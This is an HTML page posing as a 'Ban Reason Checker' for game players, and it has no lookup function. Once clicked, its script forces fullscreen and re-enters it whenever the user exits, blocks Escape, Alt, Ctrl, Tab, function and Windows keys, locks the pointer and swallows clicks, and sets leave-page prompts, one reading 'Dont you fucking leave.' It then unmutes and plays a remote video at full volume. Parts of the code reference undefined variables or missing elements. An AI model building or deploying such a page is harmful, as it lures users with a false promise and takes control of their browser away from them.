<!DOCTYPE html>
<html lang="en">
  <head>
    <link
      rel="preconnect"
      href="https://divinity.adiavi.com/incorrect/e34fe1ed-e9df-4f96-94cb-6b18d7b9e5e3.mp4"
    />
    <meta charset="UTF-8" />
    <meta content="width=device-width,initial-scale=1" name="viewport" />
    <title>Ban Reason Checker</title>
    <meta
      content="Find your ban reason by simply inputting your IGN (In Game Name) into the search query."
      name="description"
    />
    <meta content="Ban Reason Checker" name="author" />
    <meta content="Ban Reason Checker" property="og:title" />
    <meta
      content="Find your ban reason by simply inputting your IGN (In Game Name) into the search query."
      property="og:description"
    />
    <meta content="https://i.imgur.com/9L9bVj8.png" property="og:image" />
    <meta content="website" property="og:type" />
    <meta content="summary_large_image" name="twitter:card" />
    <meta content="Ban Reason Checker" name="twitter:title" />
    <meta
      content="Find your ban reason by simply inputting your IGN (In Game Name) into the search query."
      name="twitter:description"
    />
    <meta content="https://i.imgur.com/9L9bVj8.png" name="twitter:image" />
    <style>
      .hidden {
        display: none !important;
        opacity: 0 !important;
        visibility: hidden !important;
      }
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        overflow: hidden;
        background: black;
      }

      .lyrics {
        font-size: 24px;
        line-height: 1.6;
        margin: 20px 0;
      }
      .chorus {
        font-weight: bold;
      }
      .bridge {
        font-style: italic;
      }

      .enter-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;

        display: flex;
        justify-content: center;
        align-items: center;
        cursor: pointer;
        z-index: 1000;
      }

      .enter-text {
        color: white;
        font-size: 24px;
        font-family: Arial, sans-serif;
      }

      .main-content {
        display: none;
        width: 100%;
        height: 100vh;
        position: relative;
      }

      .background-video {
        position: fixed;
        right: 0;
        bottom: 0;
        min-width: 100%;
        min-height: 100%;
        width: auto;
        height: auto;
        z-index: -1;
      }
      .background-video.active {
        z-index: 999;
      }

      .glassmorphic-rectangle {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        padding: 20px;
        border-radius: 10px;
        color: white;
        max-width: 80%;
        max-height: 80vh;
        overflow-y: auto;
        z-index: 1000;
      }

      #overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        z-index: 999;
      }

      #enterScreen {
        cursor: pointer;
      }

      #mainContent {
        display: none;
      }

      .enter-screen {
        cursor: pointer;
      }
      body,
      html {
        margin: 0;
        padding: 0;
        background-color: #151912;
        overflow-x: hidden;
      }

      .content {
        width: 100vw;
        font-family: "Times New Roman", serif;
      }

      .section {
        width: 100%;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #fff6f7;
        text-align: center;
      }

      .section > div {
        width: 90%;
      }

      .section:nth-child(1) {
        font-size: 20vh;
      }

      @media (max-width: 600px) {
        .section:nth-child(1) {
          font-size: 25vw;
        }
      }

      @media (max-width: 350px) {
        .section:nth-child(1) {
          font-size: 30px;
        }
      }

      .section:nth-child(2) {
        font-size: 10vh;
      }

      .section:nth-child(3) {
        font-size: 8vh;
      }

      .section:nth-child(2) > div {
        max-width: 800px;
      }

      .section:nth-child(3) > div {
        max-width: 900px;
      }

      @media (max-width: 750px) {
        .section:nth-child(2),
        .section:nth-child(3) {
          font-size: 9vw;
        }
      }

      .section:nth-child(3) a {
        padding: 0 0.3em;
      }

      canvas#neuro {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        pointer-events: none;
        opacity: 0.95;
      }

      a {
        display: inline-block;
        text-decoration: none;
        color: inherit;
        font-weight: inherit;
        font-style: inherit;
      }

      a:hover {
        font-weight: inherit;
        text-decoration: none;
        color: rgb(160, 160, 255);
      }

      a:active {
        color: rgb(160, 255, 255);
      }

      body,
      html {
        margin: 0;
        padding: 0;
      }

      .content {
        width: 100vw;
        font-family: "Times New Roman", serif;
      }

      .section {
        width: 100%;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #fff6f7;
        text-align: center;
      }

      .section > div {
        width: 90%;
      }

      .section:nth-child(1) {
        font-size: 20vh;
      }

      @media (max-width: 600px) {
        .section:nth-child(1) {
          font-size: 25vw;
        }
      }

      @media (max-width: 350px) {
        .section:nth-child(1) {
          font-size: 30px;
        }
      }

      .section:nth-child(2) {
        font-size: 10vh;
      }

      .section:nth-child(3) {
        font-size: 8vh;
      }

      .section:nth-child(2) > div {
        max-width: 800px;
      }

      .section:nth-child(3) > div {
        max-width: 900px;
      }

      @media (max-width: 750px) {
        .section:nth-child(2),
        .section:nth-child(3) {
          font-size: 9vw;
        }
      }

      .section:nth-child(3) a {
        padding: 0 0.3em;
      }

      canvas#neuro {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        pointer-events: none;
        opacity: 0.95;
      }

      a {
        display: inline-block;
        text-decoration: none;
        color: inherit;
        font-weight: inherit;
        font-style: inherit;
      }

      a:hover {
        font-weight: inherit;
        text-decoration: none;
        color: rgb(160, 160, 255);
      }

      a:active {
        color: rgb(160, 255, 255);
      }

      @import url("https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,500&display=swap");

      :root {
        --shiny-cta-bg: #000000;
        --shiny-cta-bg-subtle: #1a1818;
        --shiny-cta-fg: #ffffff;
        --shiny-cta-highlight: rgb(0, 255, 187);
        --shiny-cta-highlight-subtle: #8484ff;
      }

      @property --gradient-angle {
        syntax: "<angle>";
        initial-value: 0deg;
        inherits: false;
      }

      @property --gradient-angle-offset {
        syntax: "<angle>";
        initial-value: 0deg;
        inherits: false;
      }

      @property --gradient-percent {
        syntax: "<percentage>";
        initial-value: 5%;
        inherits: false;
      }

      @property --gradient-shine {
        syntax: "<color>";
        initial-value: white;
        inherits: false;
      }

      .shiny-cta {
        z-index: 999 !important;
        --animation: gradient-angle linear infinite;
        --duration: 3s;
        --shadow-size: 2px;
        isolation: isolate;
        position: relative;
        overflow: hidden;
        cursor: pointer;
        outline-offset: 4px;
        padding: 1.25rem 2.5rem;
        font-family: inherit;
        font-size: 1.125rem;
        line-height: 1.2;
        border: 1px solid transparent;
        border-radius: 360px;
        color: var(--shiny-cta-fg);
        background: linear-gradient(var(--shiny-cta-bg), var(--shiny-cta-bg))
            padding-box,
          conic-gradient(
              from calc(var(--gradient-angle) - var(--gradient-angle-offset)),
              transparent,
              var(--shiny-cta-highlight) var(--gradient-percent),
              var(--gradient-shine) calc(var(--gradient-percent) * 2),
              var(--shiny-cta-highlight) calc(var(--gradient-percent) * 3),
              transparent calc(var(--gradient-percent) * 4)
            )
            border-box;
        box-shadow: inset 0 0 0 1px var(--shiny-cta-bg-subtle);
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        &::before,
        &::after,
        span::before {
          content: "";
          pointer-events: none;
          position: absolute;
          inset-inline-start: 50%;
          inset-block-start: 50%;
          translate: -50% -50%;
          z-index: -1;
        }

        &:active {
          translate: 0 1px;
        }
      }

      /* Dots pattern */
      .shiny-cta::before {
        --size: calc(100% - var(--shadow-size) * 3);
        --position: 2px;
        --space: calc(var(--position) * 2);
        width: var(--size);
        height: var(--size);
        background: radial-gradient(
            circle at var(--position) var(--position),
            white calc(var(--position) / 4),
            transparent 0
          )
          padding-box;
        background-size: var(--space) var(--space);
        background-repeat: space;
        mask-image: conic-gradient(
          from calc(var(--gradient-angle) + 45deg),
          black,
          transparent 10% 90%,
          black
        );
        border-radius: inherit;
        opacity: 0.4;
        z-index: -1;
      }

      /* Inner shimmer */
      .shiny-cta::after {
        --animation: shimmer linear infinite;
        width: 100%;
        aspect-ratio: 1;
        background: linear-gradient(
          -50deg,
          transparent,
          var(--shiny-cta-highlight),
          transparent
        );
        mask-image: radial-gradient(circle at bottom, transparent 40%, black);
        opacity: 0.6;
      }

      .shiny-cta span {
        z-index: 999 !important;

        &::before {
          --size: calc(100% + 1rem);
          width: var(--size);
          height: var(--size);
          box-shadow: inset 0 -1ex 2rem 4px var(--shiny-cta-highlight);
          opacity: 0;
        }
      }

      /* Animate */
      .shiny-cta {
        --transition: 800ms cubic-bezier(0.25, 1, 0.5, 1);
        transition: var(--transition);
        transition-property: --gradient-angle-offset, --gradient-percent,
          --gradient-shine;

        &,
        &::before,
        &::after {
          animation: var(--animation) var(--duration),
            var(--animation) calc(var(--duration) / 0.4) reverse paused;
          animation-composition: add;
        }

        span::before {
          transition: opacity var(--transition);
          animation: calc(var(--duration) * 1.5) breathe linear infinite;
        }
      }

      .shiny-cta:is(:hover, :focus-visible) {
        --gradient-percent: 20%;
        --gradient-angle-offset: 95deg;
        --gradient-shine: var(--shiny-cta-highlight-subtle);

        &,
        &::before,
        &::after {
          animation-play-state: running;
        }

        span::before {
          opacity: 1;
        }
      }

      @keyframes gradient-angle {
        to {
          --gradient-angle: 360deg;
        }
      }

      @keyframes shimmer {
        to {
          rotate: 360deg;
        }
      }

      @keyframes breathe {
        from,
        to {
          scale: 1;
        }
        50% {
          scale: 1.2;
        }
      }

      html,
      body {
        height: 100%;
      }

      body {
        display: grid;
        place-items: center;
        color: white;
        background: #02040c;
        font-family: "Inter", sans-serif;
        font-optical-sizing: auto;
        font-weight: 500;
        font-style: normal;
        -webkit-font-smoothing: antialiased;
      }
    </style>
  </head>
  <body>
    <canvas id="neuro"></canvas>

    <script type="x-shader/x-fragment" id="vertShader">
      precision mediump float;

      varying vec2 vUv;
      attribute vec2 a_position;

      void main() {
          vUv = .5 * (a_position + 1.);
          gl_Position = vec4(a_position, 0.0, 1.0);
      }
    </script>

    <script type="x-shader/x-fragment" id="fragShader">
      precision mediump float;

      varying vec2 vUv;
      uniform float u_time;
      uniform float u_ratio;
      uniform vec2 u_pointer_position;
      uniform float u_scroll_progress;

      vec2 rotate(vec2 uv, float th) {
          return mat2(cos(th), sin(th), -sin(th), cos(th)) * uv;
      }

      float neuro_shape(vec2 uv, float t, float p) {
          vec2 sine_acc = vec2(0.);
          vec2 res = vec2(0.);
          float scale = 8.;

          for (int j = 0; j < 15; j++) {
              uv = rotate(uv, 1.);
              sine_acc = rotate(sine_acc, 1.);
              vec2 layer = uv * scale + float(j) + sine_acc - t;
              sine_acc += sin(layer);
              res += (.5 + .5 * cos(layer)) / scale;
              scale *= (1.2 - .07 * p);
          }
          return res.x + res.y;
      }

      void main() {
          vec2 uv = .5 * vUv;
          uv.x *= u_ratio;

          vec2 pointer = vUv - u_pointer_position;
          pointer.x *= u_ratio;
          float p = clamp(length(pointer), 0., 1.);
          p = .5 * pow(1. - p, 2.);

          float t = .001 * u_time;
          vec3 color = vec3(0.);

          float noise = neuro_shape(uv, t, p);

          noise = 1.2 * pow(noise, 3.);
          noise += pow(noise, 10.);
          noise = max(.0, noise - .5);
          noise *= (1. - length(vUv - .5));

          color = normalize(vec3(.2, .5 + .4 * cos(3. * u_scroll_progress), .5 + .5 * sin(3. * u_scroll_progress)));

          color = color * noise;

          gl_FragColor = vec4(color, noise);
      }
    </script>
    <button class="shiny-cta">
      <span>Click To Enter...</span>
    </button>
    <div class="enter-screen" id="enterScreen">
      <div class="enter-text"></div>
    </div>

    <div class="main-content" id="mainContent">
      <video
        autoplay
        class="background-video"
        id="backgroundVideo"
        loop
        muted
        preload="auto"
      >
        <source
          src="https://divinity.adiavi.com/incorrect/e34fe1ed-e9df-4f96-94cb-6b18d7b9e5e3.mp4"
          type="video/mp4"
        />
      </video>

      <div class="glassmorphic-rectangle">
        <h1>Never Gonna Give You Up</h1>
        <div class="lyrics">
          <p>Hmmm hmmm hmmm hmmm hmm hmm,</p>
          <p>Hmm hmm hmm hmmm hmmm,</p>
          <p>Hmmm hmmm hmm hmm, hmmm hmmm hmmm,</p>
          <p>Hmmm hmmm hmmm hmmm hmm hmm.</p>
        </div>

        <div class="lyrics chorus">
          <p>Hmmm hmmm hmm hmmm hmm hmm,</p>
          <p>Hmm hmmm hmmm hmmm hmm hmm hmm,</p>
          <p>Hmmm hmmm hmmm hmmm hmmm hmmm hmmm,</p>
          <p>Hmmm hmmm hmmm hmmm hmmm hmmm.</p>
        </div>

        <div class="lyrics bridge">
          <p>Hmmm hmmm hmmm hmmm hmm hmm,</p>
          <p>Hmm hmmm hmmm hmmm hmm hmm hmmm.</p>
          <p>Hmmm hmmm hmmm hmmm hmm hmm,</p>
          <p>Hmmm hmmm hmmm hmmm hmmm hmmm hmmm.</p>
        </div>
      </div>
    </div>

    <div id="overlay"></div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
      // disable rbm
      document.addEventListener("contextmenu", (event) =>
        event.preventDefault()
      );

      document.addEventListener("keydown", function (event) {
        if (event.ctrlKey || event.key === "Escape") {
          event.preventDefault();
          return false;
        }
      });

      document.addEventListener(
        "keydown",
        function (event) {
          // all keys we want to block
          const blockedKeys = [
            "Tab",
            "F4",
            "F11",
            "F1",
            "F5",
            "BrowserBack",
            "BrowserForward",
            "BrowserHome",
            "Escape",
          ];

          // always prevent Alt+Tab, Alt+F4, etc
          if (event.altKey || event.key === "Alt") {
            event.stopPropagation();
            event.stopImmediatePropagation();
            event.preventDefault();
            return false;
          }

          // always prevent Windows key / Command key
          if (event.metaKey || event.key === "Meta" || event.key === "OS") {
            event.stopPropagation();
            event.stopImmediatePropagation();
            event.preventDefault();
            return false;
          }

          // block Ctrl combinations
          if (event.ctrlKey || event.key === "Escape") {
            event.stopPropagation();
            event.stopImmediatePropagation();
            event.preventDefault();
            return false;
          }

          // block specific function keys and other shortcuts
          if (blockedKeys.includes(event.key)) {
            event.stopPropagation();
            event.stopImmediatePropagation();
            event.preventDefault();
            return false;
          }
        },
        true
      ); // Use capturing phase

      // block key up events as well
      document.addEventListener(
        "keyup",
        function (event) {
          if (
            event.key === "Meta" ||
            event.key === "Alt" ||
            event.key === "OS"
          ) {
            event.stopPropagation();
            event.stopImmediatePropagation();
            event.preventDefault();
            return false;
          }
        },
        true
      ); // Use capturing phase

      // prevent Tab navigation
      document.addEventListener(
        "focus",
        function (event) {
          event.stopPropagation();
          event.preventDefault();
          return false;
        },
        true
      );

      // block mouse button back and forwards
      document.addEventListener(
        "mousedown",
        function (event) {
          if (event.button === 3 || event.button === 4) {
            // block browser back/forward buttons
            event.stopPropagation();
            event.preventDefault();
            return false;
          }
        },
        true
      );

      // prevent drag events
      document.addEventListener(
        "dragstart",
        function (event) {
          event.stopPropagation();
          event.preventDefault();
          return false;
        },
        true
      );

      // disable all browser shortcuts
      window.addEventListener("beforeunload", function (event) {
        event.preventDefault();
        event.returnValue = "";
        return "";
      });

      // Lock pointer when clicking on canvas
      $(document).mousemove(function () {
        const canvas = document.getElementById("mycanvas");
        if (canvas) {
          const requestPointerLock =
            canvas.requestPointerLock ||
            canvas.mozRequestPointerLock ||
            canvas.webkitRequestPointerLock;
          requestPointerLock.call(canvas);
        }
      });

      // enter screen click
      const enterScreen = document.getElementById("enterScreen");
      const mainContent = document.getElementById("mainContent");
      const backgroundVideo = document.getElementById("backgroundVideo");

      backgroundVideo.addEventListener("canplaythrough", function () {
        console.log("Video activated 😈");
      });

      enterScreen.addEventListener("click", function () {
        requestFullscreen()
          .then(() => {
            mainContent.style.display = "block";
            enterScreen.style.display = "none";

            // Add active class to video to trigger z-index change
            backgroundVideo.classList.add("active");

            backgroundVideo.play().then(() => {
              backgroundVideo.muted = false;
              backgroundVideo.volume = 1.0;
            });

            // keyboard lock
            if (navigator.keyboard) {
              navigator.keyboard.lock(["Escape"]).catch((err) => {
                console.error("Keyboard lock error:", err);
              });
            }

            // lock pointer after clicking thje overlay thingy
            document.body.requestPointerLock =
              document.body.requestPointerLock ||
              document.body.mozRequestPointerLock ||
              document.body.webkitRequestPointerLock;
            document.body.requestPointerLock();
          })
          .catch((error) => {
            console.error("Initial fullscreen request failed, retrying...");
            // retry if it failed
            setTimeout(() => {
              requestFullscreen();
            }, 500);
          });
      });

      // request fullscreen function
      function requestFullscreen() {
        const elem = document.documentElement;
        const requestFullscreen =
          elem.requestFullscreen ||
          elem.webkitRequestFullscreen ||
          elem.msRequestFullscreen ||
          elem.mozRequestFullScreen;

        return new Promise((resolve, reject) => {
          const fullscreenResult = requestFullscreen.call(elem);
          if (fullscreenResult) {
            resolve();
          } else {
            reject("Fullscreen request failed");
          }
        });
      }

      // pointer lock changing state handler
      document.addEventListener("pointerlockchange", lockChangeAlert, false);
      document.addEventListener("mozpointerlockchange", lockChangeAlert, false);
      document.addEventListener(
        "webkitpointerlockchange",
        lockChangeAlert,
        false
      );

      function lockChangeAlert() {
        if (document.pointerLockElement === document.body) {
          document.addEventListener("mousedown", blockMouseButtons, true);
          document.addEventListener("mouseup", blockMouseButtons, true);
          document.addEventListener("click", blockMouseButtons, true);
          document.addEventListener("contextmenu", blockMouseButtons, true);
        } else {
          document.removeEventListener("mousedown", blockMouseButtons, true);
          document.removeEventListener("mouseup", blockMouseButtons, true);
          document.removeEventListener("click", blockMouseButtons, true);
          document.removeEventListener("contextmenu", blockMouseButtons, true);
        }
      }

      function blockMouseButtons(e) {
        e.preventDefault();
        e.stopPropagation();
      }

      // fullscreen changes
      const fullscreenChangeHandler = function () {
        if (
          !document.fullscreenElement &&
          !document.webkitFullscreenElement &&
          !document.mozFullScreenElement &&
          !document.msFullscreenElement
        ) {
          // reenter fullscreen if user tries to exit (testing)
          const elem = document.documentElement;
          const requestFullscreen =
            elem.requestFullscreen ||
            elem.webkitRequestFullscreen ||
            elem.msRequestFullscreen ||
            elem.mozRequestFullScreen;
          requestFullscreen.call(elem).catch((error) => {
            console.error("Fullscreen reentry error:", error);
          });
        }
      };

      document.addEventListener("fullscreenchange", fullscreenChangeHandler);
      document.addEventListener(
        "webkitfullscreenchange",
        fullscreenChangeHandler
      );
      document.addEventListener("mozfullscreenchange", fullscreenChangeHandler);
      document.addEventListener("MSFullscreenChange", fullscreenChangeHandler);

      // prevent leaving pge
      window.onbeforeunload = function () {
        return "Dont you fucking leave.";
      };

      // Window management
      window.onload = function () {
        window.moveTo(0, 0);
        window.resizeTo(screen.availWidth, screen.availHeight);
      };

      // TESTING ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      (function ($) {
        $.fn.countTo = function (options) {
          options = options || {};
          return $(this).each(function () {
            const settings = $.extend(
              {},
              $.fn.countTo.defaults,
              {
                from: $(this).data("from"),
                to: $(this).data("to"),
                speed: $(this).data("speed"),
                refreshInterval: $(this).data("refresh-interval"),
                decimals: $(this).data("decimals"),
              },
              options
            );

            const loops = Math.ceil(settings.speed / settings.refreshInterval),
              increment = (settings.to - settings.from) / loops;

            let value = settings.from,
              loopCount = 0;

            const counter = setInterval(updateTimer, settings.refreshInterval);

            function updateTimer() {
              value += increment;
              loopCount++;

              $(this).html(value.toFixed(settings.decimals));

              if (loopCount >= loops) {
                clearInterval(counter);
                value = settings.to;
                $(this).html(value.toFixed(settings.decimals));
              }
            }
          });
        };

        $.fn.countTo.defaults = {
          from: 0,
          to: 0,
          speed: 1000,
          refreshInterval: 100,
          decimals: 0,
          onUpdate: null,
          onComplete: null,
        };
      })(jQuery);

      jQuery(function ($) {
        $(".timer").each(function () {
          const options = $.extend({}, $(this).data("countToOptions") || {});
          $(this).countTo(options);
        });
      });

      document.addEventListener("keyup", function (event) {
        if (event.key === "Escape") {
          const holdTime = Date.now() - escapeKeyHoldTime;
          holdToEscapeMessage.style.display = "none";
          if (holdTime >= holdDuration) {
            console.log("Exiting fullscreen...");
            if (document.fullscreenElement) {
              document.exitFullscreen();
            } else if (document.webkitFullscreenElement) {
              document.webkitExitFullscreen();
            } else if (document.mozFullScreenElement) {
              document.mozCancelFullScreen();
            } else if (document.msFullscreenElement) {
              document.msExitFullscreen();
            }
          }
        }
      });
      // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      const containerEl = document.querySelector(".container");
      const canvasEl = document.querySelector("canvas#neuro");
      const devicePixelRatio = Math.min(window.devicePixelRatio, 2);

      const pointer = {
        x: 0,
        y: 0,
        tX: 0,
        tY: 0,
      };

      let uniforms;
      const gl = initShader();

      setupEvents();

      resizeCanvas();
      window.addEventListener("resize", resizeCanvas);

      render();

      function initShader() {
        const vsSource = document.getElementById("vertShader").innerHTML;
        const fsSource = document.getElementById("fragShader").innerHTML;

        const gl =
          canvasEl.getContext("webgl") ||
          canvasEl.getContext("experimental-webgl");

        if (!gl) {
          alert("WebGL is not supported by your browser.");
        }

        function createShader(gl, sourceCode, type) {
          const shader = gl.createShader(type);
          gl.shaderSource(shader, sourceCode);
          gl.compileShader(shader);

          if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
            console.error(
              "An error occurred compiling the shaders: " +
                gl.getShaderInfoLog(shader)
            );
            gl.deleteShader(shader);
            return null;
          }

          return shader;
        }

        const vertexShader = createShader(gl, vsSource, gl.VERTEX_SHADER);
        const fragmentShader = createShader(gl, fsSource, gl.FRAGMENT_SHADER);

        function createShaderProgram(gl, vertexShader, fragmentShader) {
          const program = gl.createProgram();
          gl.attachShader(program, vertexShader);
          gl.attachShader(program, fragmentShader);
          gl.linkProgram(program);

          if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
            console.error(
              "Unable to initialize the shader program: " +
                gl.getProgramInfoLog(program)
            );
            return null;
          }

          return program;
        }

        const shaderProgram = createShaderProgram(
          gl,
          vertexShader,
          fragmentShader
        );
        uniforms = getUniforms(shaderProgram);

        function getUniforms(program) {
          let uniforms = [];
          let uniformCount = gl.getProgramParameter(
            program,
            gl.ACTIVE_UNIFORMS
          );
          for (let i = 0; i < uniformCount; i++) {
            let uniformName = gl.getActiveUniform(program, i).name;
            uniforms[uniformName] = gl.getUniformLocation(program, uniformName);
          }
          return uniforms;
        }

        const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);

        const vertexBuffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);

        gl.useProgram(shaderProgram);

        const positionLocation = gl.getAttribLocation(
          shaderProgram,
          "a_position"
        );
        gl.enableVertexAttribArray(positionLocation);

        gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
        gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);

        return gl;
      }

      function render() {
        const currentTime = performance.now();

        pointer.x += (pointer.tX - pointer.x) * 0.5;
        pointer.y += (pointer.tY - pointer.y) * 0.5;

        gl.uniform1f(uniforms.u_time, currentTime);
        gl.uniform2f(
          uniforms.u_pointer_position,
          pointer.x / window.innerWidth,
          1 - pointer.y / window.innerHeight
        );
        gl.uniform1f(
          uniforms.u_scroll_progress,
          window["pageYOffset"] / (2 * window.innerHeight)
        );

        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
        requestAnimationFrame(render);
      }

      function resizeCanvas() {
        canvasEl.width = window.innerWidth * devicePixelRatio;
        canvasEl.height = window.innerHeight * devicePixelRatio;
        gl.uniform1f(uniforms.u_ratio, canvasEl.width / canvasEl.height);
        gl.viewport(0, 0, canvasEl.width, canvasEl.height);
      }

      function setupEvents() {
        window.addEventListener("pointermove", (e) => {
          updateMousePosition(e.clientX, e.clientY);
        });
        window.addEventListener("touchmove", (e) => {
          updateMousePosition(
            e.targetTouches[0].clientX,
            e.targetTouches[0].clientY
          );
        });
        window.addEventListener("click", (e) => {
          updateMousePosition(e.clientX, e.clientY);
        });

        function updateMousePosition(eX, eY) {
          pointer.tX = eX;
          pointer.tY = eY;
        }
      }
    </script>
  </body>
</html>
